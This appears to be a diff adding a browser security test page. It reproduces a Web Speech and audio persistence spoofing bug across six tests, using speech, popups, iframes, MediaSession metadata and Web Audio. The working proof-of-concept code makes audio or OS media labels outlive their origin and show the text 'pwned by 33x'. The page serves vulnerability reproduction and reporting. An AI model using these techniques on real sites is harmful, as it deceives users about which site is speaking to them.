@@ -1,0 +1,349 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>S0 &mdash; cross-origin audio persistence baseline</title>
+<style>
+ :root{color-scheme:light}
+ body{font:16px/1.45 -apple-system,system-ui,sans-serif;margin:0;padding:16px 14px 45vh;background:#fff;color:#111}
+ h1{font-size:19px;margin:0 0 4px}
+ h2{font-size:13px;margin:20px 0 4px;text-transform:uppercase;letter-spacing:.04em;color:#555}
+ pre{background:#0b0b0b;color:#8f8;padding:9px;border-radius:8px;font:11px/1.5 ui-monospace,Menlo,monospace;white-space:pre-wrap;word-break:break-all;margin:8px 0}
+ button{display:block;width:100%;box-sizing:border-box;text-align:left;padding:12px 13px;margin:6px 0;font:13.5px/1.32 -apple-system,system-ui;border:1px solid #ccc;border-radius:11px;background:#f6f6f8;color:#111}
+ .go{background:#1a73e8;border-color:#1a73e8;color:#fff;font-weight:600;text-align:center;font-size:15px;padding:14px}
+ .vuln{border-color:#c00;background:#ffecec}
+ .safe{border-color:#2a7;background:#eefbf4}
+ .card{border:1px solid #e2e2e2;border-radius:12px;padding:13px;margin:11px 0}
+ .card.hit{border-color:#c00;background:#fff7f7}
+ .card.clear{border-color:#2a7;background:#f6fdf9}
+ .card h3{font-size:14.5px;margin:0 0 4px}
+ .n{color:#555;font-size:12.5px;line-height:1.5}
+ #mark{display:none;margin:18px 0;padding:18px;border:3px solid #c00;border-radius:12px}
+ #mark .hd{display:block;font:800 28px/1.1 -apple-system;color:#c00;letter-spacing:-.5px}
+ .warn{background:#fff8e0;border:1px solid #e0c060;border-radius:10px;padding:11px;font-size:12.5px;margin:10px 0}
+</style>
+
+<h1>S0 &mdash; cross-origin audio persistence</h1>
+<p class="n">Baseline control for the Web Speech API spoofing class
+(CVE-2026-7935 Chrome / CVE-2026-8963 Firefox / WebKit via Apple). Establishes whether the
+original technique still reproduces on <b>this</b> build before chasing variants.</p>
+
+<div class="warn"><b>Turn the volume up.</b> The proof is audible, not visual. Every test speaks
+the literal marker <b>&ldquo;pwned by 33x&rdquo;</b>. If you hear it while the address bar shows
+a different origin &mdash; or after the tab is gone &mdash; the issue is live on this build.</div>
+
+<pre id="env"></pre>
+<div id="mark"><span class="hd">pwned by 33x</span><div id="why" style="margin-top:9px;font-size:13.5px"></div></div>
+
+<h2>Pre-flight</h2>
+<div class="card">
+ <h3>0 &middot; does speech work here at all?</h3>
+ <p class="n">Control. If you hear nothing here, every result below is meaningless &mdash; check
+ volume, silent switch, and that a voice is installed.</p>
+ <button class="go" id="t0">speak locally (no navigation)</button>
+ <div id="q0"></div>
+</div>
+
+<h2>Test 1 &middot; the published technique</h2>
+<div class="card" id="c1">
+ <h3>1 &middot; speak &rarr; navigate cross-origin</h3>
+ <p class="n">Speaks a long utterance, then navigates to <b>google.com</b> after 1s. Vulnerable =
+ the voice keeps talking while the bar reads google.com.</p>
+ <button class="go" id="t1">run test 1</button>
+ <p class="n">Come back here with the back gesture afterwards to record what you heard.</p>
+ <div id="q1"></div>
+</div>
+
+<h2>Test 2 &middot; speak, then destroy the tab</h2>
+<div class="card" id="c2">
+ <h3>2 &middot; popup speaks &rarr; window.close()</h3>
+ <p class="n">A script-opened tab speaks, then closes itself. Vulnerable = audio continues with
+ <b>no tab and no origin at all</b> on screen &mdash; strictly worse than test 1.</p>
+ <button class="go" id="t2">run test 2</button>
+ <div id="q2"></div>
+</div>
+
+<h2>Test 3 &middot; iframe outlives itself</h2>
+<div class="card" id="c3">
+ <h3>3 &middot; cross-origin iframe speaks &rarr; iframe removed</h3>
+ <p class="n">A sandboxed <code>srcdoc</code> iframe (opaque origin) speaks, then the parent
+ removes it from the DOM. Vulnerable = speech continues after its document no longer exists.
+ Note: opaque-origin speech is <i>attributable to nothing</i>, which is the point.</p>
+ <button class="go" id="t3">run test 3</button>
+ <div id="q3"></div>
+</div>
+
+<h2>Test 4 &middot; queue survives cancellation</h2>
+<div class="card" id="c4">
+ <h3>4 &middot; many queued utterances &rarr; navigate</h3>
+ <p class="n">Queues 8 separate utterances rather than one long one, then navigates. Tests
+ whether a fix cancels only the <i>current</i> utterance and lets the rest of the queue drain.</p>
+ <button class="go" id="t4">run test 4</button>
+ <div id="q4"></div>
+</div>
+
+<h2>Test 5 &middot; MediaSession metadata &#9733;</h2>
+<div class="card" id="c5">
+ <h3>5 &middot; OS media UI carries attacker text</h3>
+ <p class="n">Plays silent looping audio and sets
+ <code>navigator.mediaSession.metadata</code>, then navigates away. Check
+ <b>macOS Now Playing / iOS lock screen / Control Center</b>. Vulnerable = the OS shows
+ <b>&ldquo;pwned by 33x&rdquo;</b> as the track title, with <b>no origin named anywhere</b>,
+ while the browser is on a different site.</p>
+ <button class="go" id="t5">run test 5</button>
+ <div id="q5"></div>
+</div>
+
+<h2>Test 6 &middot; Web Audio persistence</h2>
+<div class="card" id="c6">
+ <h3>6 &middot; AudioContext tone &rarr; navigate</h3>
+ <p class="n">Starts a 440&nbsp;Hz oscillator via Web Audio, then navigates. Vulnerable = the
+ tone persists cross-origin. (Speech is only one instance of the general class; this asks
+ whether the same holds for raw audio.)</p>
+ <button class="go" id="t6">run test 6</button>
+ <div id="q6"></div>
+</div>
+
+<h2>Verdict</h2>
+<button class="go" id="fin" style="background:#c00;border-color:#c00">show verdict</button>
+<pre id="log">log:</pre>
+
+<script>
+(function(){
+ var MARK = 'pwned by 33x';
+ var LONG = MARK + '. ' + MARK + '. This audio is being produced by ' +
+   location.hostname + ', not by the site now shown in your address bar. ' +
+   MARK + '. Nothing on screen identifies where this voice is coming from. ' +
+   MARK + '. End of test.';
+ var NAV = 'https://www.google.com/';
+ var HITS = {};
+
+ function L(s){ var l=document.getElementById('log'); l.textContent += '\n' + s; }
+
+ var ua = navigator.userAgent;
+ var engine = /Firefox|FxiOS/.test(ua) ? 'Gecko'
+            : /Chrome|CriOS|Chromium|Edg|Brave|OPR/.test(ua) ? 'Blink'
+            : /Safari|AppleWebKit/.test(ua) ? 'WebKit' : 'unknown';
+ var voices = [];
+ function refreshVoices(){
+   try { voices = speechSynthesis.getVoices() || []; } catch(e){ voices = []; }
+   document.getElementById('env').textContent =
+     'origin        : ' + location.origin + '\n' +
+     'engine guess  : ' + engine + '\n' +
+     'userAgent     : ' + ua + '\n' +
+     'speechSynth   : ' + (('speechSynthesis' in window) ? 'present' : 'ABSENT') + '\n' +
+     'voices loaded : ' + voices.length + (voices.length ? ('  e.g. ' + voices[0].name) : '  <- none yet; tap test 0 once') + '\n' +
+     'mediaSession  : ' + (('mediaSession' in navigator) ? 'present' : 'ABSENT') + '\n' +
+     'AudioContext  : ' + ((window.AudioContext||window.webkitAudioContext) ? 'present' : 'ABSENT') + '\n' +
+     '\n' +
+     'Screenshot this block with every result -- it is what names the build under test.\n' +
+     'Also record the exact browser version from its About screen; the UA string alone\n' +
+     'does not identify a Chromium fork base (Brave/Arc/Dia all masquerade as Chrome).';
+ }
+ refreshVoices();
+ try { speechSynthesis.onvoiceschanged = refreshVoices; } catch(e){}
+
+ function utter(text, rate){
+   var u = new SpeechSynthesisUtterance(text);
+   u.rate = rate || 0.85;
+   u.volume = 1;
+   return u;
+ }
+
+ function ask(slot, cardId, key, opts){
+   var q = document.getElementById(slot);
+   if (q.dataset.b) { q.scrollIntoView({block:'center'}); return; }
+   q.dataset.b = '1';
+   var h = document.createElement('p'); h.className='n';
+   h.innerHTML = '<b>Apa yang kamu dengar / lihat?</b>';
+   q.appendChild(h);
+   opts.forEach(function(o){
+     var b = document.createElement('button');
+     b.className = o.v ? 'vuln' : 'safe';
+     b.innerHTML = o.t;
+     b.onclick = function(){
+       HITS[key] = o.v ? o : false;
+       document.getElementById(cardId).className = 'card ' + (o.v ? 'hit' : 'clear');
+       Array.prototype.forEach.call(q.querySelectorAll('button'), function(x){ x.style.opacity='.45'; });
+       b.style.opacity = '1';
+       L(key + ' = ' + (o.v ? 'HIT' : 'clear'));
+     };
+     q.appendChild(b);
+   });
+   q.scrollIntoView({block:'center'});
+ }
+
+ function armReturn(key){ try{ sessionStorage.setItem('s0', key); }catch(e){} }
+
+ // ---- test 0: control ----
+ document.getElementById('t0').onclick = function(){
+   try { speechSynthesis.cancel(); } catch(e){}
+   speechSynthesis.speak(utter(MARK + '. Speech works on this build.'));
+   L('t0: spoke locally');
+   refreshVoices();
+   ask('q0','c0','t0',[
+    {v:0,t:'I heard it &mdash; speech works, results below are meaningful'},
+    {v:0,t:'I heard NOTHING &mdash; fix audio first, every test below is invalid'}
+   ]);
+ };
+
+ // ---- test 1: speak then navigate ----
+ document.getElementById('t1').onclick = function(){
+   try { speechSynthesis.cancel(); } catch(e){}
+   speechSynthesis.speak(utter(LONG));
+   armReturn('t1');
+   L('t1: speaking, navigating to ' + NAV + ' in 1s');
+   setTimeout(function(){ window.location.href = NAV; }, 1000);
+ };
+
+ // ---- test 2: popup speaks then closes ----
+ document.getElementById('t2').onclick = function(){
+   var w = window.open('', 'sp'+Math.random().toString(36).slice(2,7));
+   if(!w){ L('t2: popup blocked -- tap the button directly'); return; }
+   var html = '<!doctype html><meta charset=utf-8><title>closing...</title>' +
+     '<body style="font:16px -apple-system;padding:30px;text-align:center">' +
+     '<p>speaking, then closing this tab...</p><script>' +
+     'var u=new SpeechSynthesisUtterance(' + JSON.stringify(LONG) + ');u.rate=0.85;' +
+     'speechSynthesis.speak(u);' +
+     'setTimeout(function(){window.close()},1200);' +
+     '<\/script></body>';
+   w.document.open(); w.document.write(html); w.document.close();
+   L('t2: popup speaking, will self-close in 1.2s');
+   ask('q2','c2','t2',[
+    {v:1,t:'voice CONTINUED after the tab vanished &mdash; audio with no tab and no origin'},
+    {v:0,t:'voice stopped the moment the tab closed'},
+    {v:0,t:'the popup never spoke at all'}
+   ]);
+ };
+
+ // ---- test 3: iframe speaks, then is removed ----
+ document.getElementById('t3').onclick = function(){
+   var f = document.createElement('iframe');
+   f.sandbox = 'allow-scripts';
+   f.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px';
+   f.srcdoc = '<script>var u=new SpeechSynthesisUtterance(' + JSON.stringify(LONG) + ');' +
+              'u.rate=0.85;speechSynthesis.speak(u);<\/script>';
+   document.body.appendChild(f);
+   L('t3: sandboxed iframe speaking; removing it in 1.2s');
+   setTimeout(function(){ f.remove(); L('t3: iframe removed from DOM'); }, 1200);
+   ask('q3','c3','t3',[
+    {v:1,t:'voice CONTINUED after the iframe was removed'},
+    {v:0,t:'voice stopped when the iframe was removed'},
+    {v:0,t:'the iframe never spoke (sandbox blocked it)'}
+   ]);
+ };
+
+ // ---- test 4: queued utterances ----
+ document.getElementById('t4').onclick = function(){
+   try { speechSynthesis.cancel(); } catch(e){}
+   for (var i = 1; i <= 8; i++) {
+     speechSynthesis.speak(utter(MARK + '. Segment ' + i + ' of eight.'));
+   }
+   armReturn('t4');
+   L('t4: queued 8 utterances, navigating in 1s');
+   setTimeout(function(){ window.location.href = NAV; }, 1000);
+ };
+
+ // ---- test 5: MediaSession metadata ----
+ document.getElementById('t5').onclick = function(){
+   try {
+     // 1s of silence, looped, so the OS keeps a Now Playing session alive
+     var silence = 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEAgD4AAAB9AAACABAAZGF0YQAAAAA=';
+     var a = document.createElement('audio');
+     a.src = silence; a.loop = true; a.volume = 0.01;
+     document.body.appendChild(a);
+     a.play().then(function(){
+       if ('mediaSession' in navigator) {
+         navigator.mediaSession.metadata = new MediaMetadata({
+           title:  MARK,
+           artist: 'served by ' + location.hostname,
+           album:  'no origin is shown in this OS panel'
+         });
+         navigator.mediaSession.playbackState = 'playing';
+         L('t5: MediaSession metadata set; navigating in 1.5s');
+       } else { L('t5: mediaSession ABSENT on this build'); }
+       armReturn('t5');
+       setTimeout(function(){ window.location.href = NAV; }, 1500);
+     }).catch(function(e){
+       L('t5: autoplay refused (' + e.message + ') -- tap the button again; a gesture is needed');
+     });
+   } catch(e){ L('t5: threw ' + e.message); }
+ };
+
+ // ---- test 6: Web Audio oscillator ----
+ document.getElementById('t6').onclick = function(){
+   try {
+     var AC = window.AudioContext || window.webkitAudioContext;
+     if (!AC) { L('t6: no AudioContext'); return; }
+     var ctx = new AC();
+     var osc = ctx.createOscillator(), g = ctx.createGain();
+     osc.frequency.value = 440; g.gain.value = 0.08;
+     osc.connect(g); g.connect(ctx.destination); osc.start();
+     armReturn('t6');
+     L('t6: 440Hz tone started, navigating in 1.2s');
+     setTimeout(function(){ window.location.href = NAV; }, 1200);
+   } catch(e){ L('t6: threw ' + e.message); }
+ };
+
+ // ---- handle return from a navigating test ----
+ var opts = {
+  t1: ['c1','q1',[
+    {v:1,t:'voice CONTINUED while the bar showed <b>google.com</b> &mdash; heard &ldquo;pwned by 33x&rdquo; there'},
+    {v:0,t:'voice stopped the instant the navigation happened'},
+    {v:0,t:'voice finished before the navigation (make the text longer / rate slower)'}
+  ]],
+  t4: ['c4','q4',[
+    {v:1,t:'MORE segments played after the navigation &mdash; the queue drained cross-origin'},
+    {v:1,t:'exactly one more segment played, then silence &mdash; partial queue leak'},
+    {v:0,t:'all speech stopped at the navigation'}
+  ]],
+  t5: ['c5','q5',[
+    {v:1,t:'OS media panel showed <b>pwned by 33x</b> while the browser was on google.com'},
+    {v:1,t:'OS media panel still showed it even after I closed the tab'},
+    {v:0,t:'the panel cleared on navigation, or named the real origin'},
+    {v:0,t:'no OS media panel appeared at all'}
+  ]],
+  t6: ['c6','q6',[
+    {v:1,t:'the 440Hz tone CONTINUED after navigating to google.com'},
+    {v:0,t:'the tone stopped at the navigation'},
+    {v:0,t:'no tone ever played'}
+  ]]
+ };
+ try {
+   var back = sessionStorage.getItem('s0');
+   if (back && opts[back]) {
+     sessionStorage.removeItem('s0');
+     L('welcome back from ' + back);
+     ask(opts[back][1], opts[back][0], back, opts[back][2]);
+   }
+ } catch(e){}
+
+ // ---- verdict ----
+ document.getElementById('fin').onclick = function(){
+   var keys = Object.keys(HITS).filter(function(k){ return HITS[k]; });
+   var m = document.getElementById('mark'), w = document.getElementById('why');
+   m.style.display = 'block';
+   if (!keys.length) {
+     m.style.borderColor = '#2a7';
+     m.querySelector('.hd').textContent = 'patched';
+     m.querySelector('.hd').style.color = '#2a7';
+     w.innerHTML = 'No channel outlived its document on this build. This browser has taken the ' +
+       'fix &mdash; record the exact version, it is useful as the negative control when reporting ' +
+       'a fork that has <i>not</i> taken it.';
+   } else {
+     m.querySelector('.hd').textContent = MARK;
+     w.innerHTML = 'Live on <b>' + keys.length + '</b> channel(s): <b>' + keys.join(', ') + '</b>' +
+       ' &mdash; on ' + engine + '.<br><br>Record the exact browser version NOW from its About ' +
+       'screen. For a Chromium fork also record the Chromium base (Brave: brave://version, ' +
+       'Arc/Dia: the About panel), because the report must name the base to prove it predates ' +
+       'the upstream fix.<br><br><b>Evidence must be a screen RECORDING with audio</b>, not a ' +
+       'screenshot &mdash; the whole finding is audible. Record the navigation and keep filming ' +
+       'until the voice stops, so the address bar and the audio are in one continuous take.' +
+       '<br><span style="font:11px ui-monospace;color:#555">' + new Date().toISOString() + '</span>';
+   }
+   m.scrollIntoView({block:'center'});
+ };
+
+ // give test 0 a card id for the ask() helper
+ document.getElementById('t0').parentNode.id = 'c0';
+})();
+</script>
